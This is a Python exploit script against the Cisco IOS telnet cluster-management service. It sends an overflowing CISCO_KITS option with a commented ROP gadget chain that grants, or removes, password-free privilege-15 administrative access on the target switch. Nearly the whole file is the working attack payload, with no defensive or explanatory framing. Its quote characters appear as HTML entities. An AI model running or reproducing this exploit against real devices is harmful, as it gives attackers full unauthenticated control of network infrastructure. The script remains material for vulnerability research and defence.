# Author:
#  Artem Kondratenko (@artkond)
 
import socket
import sys
from time import sleep
 
set_credless = True
 
if len(sys.argv) < 3:
    print sys.argv[0] + &#039; [host] --set/--unset&#039;
    sys.exit()
elif sys.argv[2] == &#039;--unset&#039;:
    set_credless = False
elif sys.argv[2] == &#039;--set&#039;:
    pass
else:
    print sys.argv[0] + &#039; [host] --set/--unset&#039;
    sys.exit()
 
 
s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 23))
 
print &#039;[+] Connection OK&#039;
print &#039;[+] Recieved bytes from telnet service:&#039;, repr(s.recv(1024))
#sleep(0.5)
print &#039;[+] Sending cluster option&#039;
 
print &#039;[+] Setting credless privilege 15 authentication&#039; if set_credless else &#039;[+] Unsetting credless privilege 15 authentication&#039;
 
 
 
payload = &#039;\xff\xfa\x24\x00&#039;
payload += &#039;\x03CISCO_KITS\x012:&#039;
payload += &#039;A&#039; * 116
payload += &#039;\x00\x00\x37\xb4&#039;       # first gadget address 0x000037b4: lwz r0, 0x14(r1); mtlr r0; lwz r30, 8(r1); lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
#next bytes are shown as offsets from r1
payload += &#039;\x02\x2c\x8b\x74&#039;       # +8  address of pointer to is_cluster_mode function - 0x34
if set_credless is True:
    payload += &#039;\x00\x00\x99\x80&#039;   # +12 set  address of func that rets 1
else:
    payload +=  &#039;\x00\x04\xea\x58&#039;  # unset 
payload += &#039;BBBB&#039;                   # +16(+0) r1 points here at second gadget
payload += &#039;\x00\xdf\xfb\xe8&#039;       # +4 second gadget address 0x00dffbe8: stw r31, 0x138(r30); lwz r0, 0x1c(r1); mtlr r0; lmw r29, 0xc(r1); addi r1, r1, 0x18; blr;
payload += &#039;CCCC&#039;                   # +8 
payload += &#039;DDDD&#039;                   # +12
payload += &#039;EEEE&#039;                   # +16(+0) r1 points here at third gadget
payload += &#039;\x00\x06\x78\x8c&#039;       # +20(+4) third gadget address. 0x0006788c: lwz r9, 8(r1); lwz r3, 0x2c(r9); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
payload += &#039;\x02\x2c\x8b\x60&#039;       # +8  r1+8 = 0x022c8b60
payload += &#039;FFFF&#039;                   # +12 
payload += &#039;GGGG&#039;                   # +16(+0) r1 points here at fourth gadget 
payload += &#039;\x00\x6b\xa1\x28&#039;       # +20(+4) fourth gadget address 0x006ba128: lwz r31, 8(r1); lwz r30, 0xc(r1); addi r1, r1, 0x10; lwz r0, 4(r1); mtlr r0; blr;
if set_credless:
    payload += &#039;\x00\x12\x52\x1c&#039;   # +8 address of the replacing function that returns 15 (our desired privilege level). 0x0012521c: li r3, 0xf; blr; 
else:
    payload += &#039;\x00\x04\xe6\xf0&#039;   # unset
payload += &#039;HHHH&#039;                   # +12
payload += &#039;IIII&#039;                   # +16(+0) r1 points here at fifth gadget
payload += &#039;\x01\x48\xe5\x60&#039;       # +20(+4) fifth gadget address 0x0148e560: stw r31, 0(r3); lwz r0, 0x14(r1); mtlr r0; lwz r31, 0xc(r1); addi r1, r1, 0x10; blr;
payload += &#039;JJJJ&#039;                   # +8 r1 points here at third gadget
payload += &#039;KKKK&#039;                   # +12
payload += &#039;LLLL&#039;                   # +16
payload += &#039;\x01\x13\x31\xa8&#039;       # +20 original execution flow return addr
payload += &#039;:15:&#039; +  &#039;\xff\xf0&#039;
 
s.send(payload)
 
print &#039;[+] All done&#039;
 
s.close()

